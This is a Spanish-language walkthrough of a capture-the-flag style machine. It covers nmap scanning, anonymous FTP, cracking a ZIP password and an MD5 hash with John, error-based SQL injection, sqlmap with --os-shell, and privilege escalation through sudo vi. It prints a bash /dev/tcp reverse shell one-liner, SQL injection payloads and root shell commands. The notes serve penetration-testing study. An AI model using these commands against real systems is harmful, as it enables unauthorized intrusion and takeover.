**Metodología de escaneo — recordatorio y matices**

El escaneo inicial siempre en dos fases. Primero un Nmap básico para identificar puertos abiertos con el mínimo ruido, y luego un segundo escaneo más detallado solo sobre los puertos encontrados:

```
nmap --min-rate 5000 IP
nmap -p 21,22,80 -sVC IP
```

El parámetro --min-rate 5000 acelera el escaneo. Cuidado en entornos reales y certificaciones: un escaneo demasiado rápido puede perder puertos si el servicio no ha terminado de levantar. Si el resultado parece incompleto, volver a lanzarlo.

El -sVC combina -sV (versiones) y -sC (scripts básicos de Nmap). El script de FTP detecta automáticamente si el anonymous login está permitido y lista el contenido del directorio. Tres puertos: 21 FTP, 22 SSH y 80 HTTP. El SSH sin credenciales es un callejón sin salida de primeras, por lo que se empieza siempre por FTP y web.

**FTP anónimo y ZIP con contraseña**

```
ftp -a IP
ls -la
get backup.zip
exit
```

El -a activa el modo anónimo directamente. El ls -la muestra permisos: si la primera columna tiene una d, es directorio; si no, es archivo. El FTP tiene su propia shell restringida con comandos propios (get, put, mget *, help). No tiene cat.

El ZIP está protegido con contraseña. Para crackearlo, primero se extrae el hash con zip2john y después se ataca con John:

```
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

El --show recupera contraseñas ya crackeadas del historial interno de John sin tener que volver a ejecutar el ataque. Muy útil cuando no se recuerda cuál era.

El ZIP contiene index.php y style.css. El CSS no es interesante. El index.php contiene el código fuente del login, incluida la lógica PHP que nunca se ve desde el navegador.

**Por qué el PHP no aparece en el código fuente del navegador:** el PHP es código del servidor. Cuando el navegador hace una petición, el servidor ejecuta el PHP y devuelve únicamente el HTML resultante. Por eso, cuando hacemos Ctrl+U en el navegador, solo vemos el HTML. El código PHP queda completamente oculto. La única forma de verlo es cuando se filtra el código fuente, como en este caso con el backup.

**Análisis del código PHP y crackeo del hash MD5**

El código del index.php revela dos cosas críticas: el usuario es admin (hardcodeado) y la contraseña se almacena como hash MD5. La comparación es: el MD5 de lo que yo introduzca tiene que ser igual al hash que está en el código.

Por lo tanto, no hay que introducir el hash, sino la contraseña original. Para encontrarla, se usa CrackStation o se identifica el tipo de hash y se crackea con John:

```
# Identificar el tipo de hash
hash-identifier

# Crackear con John
echo "HASH" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

También existe la herramienta hashid, y la página de CyberChef para encodear y decodear. CrackStation funciona porque tiene una base de datos gigantesca de hashes precalculados: para cada contraseña posible tiene guardado su hash MD5, y cuando le pasamos uno lo busca directamente. No está calculando nada en tiempo real, solo consultando su base de datos.

La contraseña obtenida es qwerty789. Con admin y qwerty789 se accede al panel.

- **La idea clave:** el MD5 es un hash unidireccional, no se puede revertir matemáticamente. Pero como para cualquier entrada siempre produce la misma salida, si alguien ha calculado antes todos los hashes posibles y los ha guardado, puede buscar el tuyo directamente. Por eso las contraseñas largas y aleatorias son difíciles de crackear: nadie ha precalculado su hash

**Detección de SQL Injection — entendiendo la comilla**

El panel tiene un buscador de coches. Al introducir una comilla simple aparece un error que muestra la consulta SQL interna. Esto es una SQL Injection basada en error, la más evidente de todas.

Para entender por qué ocurre, hay que entender qué hay por detrás. La consulta que ejecuta el servidor cuando buscamos algo es aproximadamente:

```
SELECT * FROM cars WHERE name LIKE 'lo_que_buscamos'
```

Cuando el buscador recibe una búsqueda normal, como elixir, la consulta queda bien formada. Pero cuando introducimos una comilla simple, la consulta queda así:

```
SELECT * FROM cars WHERE name LIKE 'elixir''
```

Hay una comilla de más que no cierra correctamente. La base de datos no sabe cómo interpretar eso y devuelve un error. Este error nos confirma que hay una SQL Injection, y encima nos regala la consulta entera, lo que es una fuga de información adicional.

Lo que ocurre con las inyecciones clásicas de login del tipo admin'-- es exactamente esto: cerramos antes de tiempo la comilla que envuelve el valor del usuario, y con -- comentamos todo lo que viene después, que en este caso es la comprobación de la contraseña. La consulta pasa de comprobar usuario Y contraseña a comprobar solo el usuario.

Otro clásico es ' OR 1 igual a 1 --, donde se añade una condición que siempre es verdadera después de cerrar la comilla, forzando que la consulta devuelva todos los registros.

El timing también es una técnica de detección: si insertar ciertos caracteres hace que la página tarde cinco segundos en responder en vez de milisegundos, hay una SQL Injection basada en tiempo, incluso si no se ve ningún error en pantalla. Esto se llama Blind SQLI.

- **La idea clave:** una SQL Injection no es magia. Es simplemente que el input del usuario se mete directamente dentro de la consulta SQL sin ser validado ni escapado. Al introducir una comilla, el atacante puede cerrar la cadena antes de tiempo y añadir sus propios fragmentos de consulta. El servidor no distingue entre la consulta original y la parte inyectada

**SQLMap con cookie de sesión**

Como el panel requiere autenticación, SQLMap necesita la cookie de sesión para acceder. Sin ella, detecta el redirect al login y no puede analizar el parámetro vulnerable.

La cookie se obtiene desde el inspector del navegador: Storage → Cookies → valor del PHPSESSID. La extensión Cookie Editor facilita copiarla.

Las cookies de sesión caducan. Si el ataque falla de repente con un redirect al login, es probable que la cookie haya expirado y haya que volver a loguear y copiar la nueva.

```
sqlmap -u "http://IP/dashboard.php?search=test" --cookie="PHPSESSID=VALOR"
```

SQLMap detecta que el parámetro search es vulnerable mediante técnicas de error y de tiempo. Una vez confirmada la vulnerabilidad, se añade --os-shell para obtener una shell como el usuario del servicio de base de datos:

```
sqlmap -u "http://IP/dashboard.php?search=test" --cookie="PHPSESSID=VALOR" --os-shell
```

El usuario obtenido es postgres, el usuario del servicio PostgreSQL. Desde esta shell incómoda se lanza una reverse shell más cómoda con un one-liner de Bash:

```
bash -c 'bash -i >& /dev/tcp/NUESTRA_IP/9999 0>&1'
```

Con Netcat escuchando en el puerto 9999, la conexión llega con una shell más manejable.

**Importante sobre SQLMap:** hace una cantidad enorme de ruido, prueba cientos de payloads y puede romper servicios en producción. No debe usarse en entornos reales sin autorización explícita. En certificaciones importantes como OSCP no está permitido.

**Estabilización de la TTY**

Las reverse shells suelen ser inestables. Para mejorarlas, el método más fiable es Python:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Si Python3 no está disponible, probar con python (versión 2). Esta técnica de upgrade de TTY se usará constantemente en todas las máquinas a partir de ahora.

---

**Escalada de privilegios con vi y GTFOBins**

El sudo -l con el usuario postgres revela que puede ejecutar /bin/vi sobre un fichero de configuración como root sin contraseña. GTFOBins ([gtfobins.github.io](http://gtfobins.github.io/)) documenta cómo abusar de binarios con permisos sudo para escalar privilegios.

En el caso de vi:

```
sudo /bin/vi /etc/postgresql/.../postgresql.conf
# Dentro de vi:
:set shell=/bin/bash
:shell
```

Esto abre una shell como root. La flag final está en /root/root.txt.

GTFOBins es una referencia que hay que guardar: dado cualquier binario que se pueda ejecutar como sudo, explica paso a paso cómo abusar de él. El patrón es siempre el mismo: el binario tiene permiso de ejecutarse como root, nosotros tenemos permiso de ejecutarlo, y ese binario tiene alguna funcionalidad que nos permite abrir una shell o leer ficheros arbitrarios.
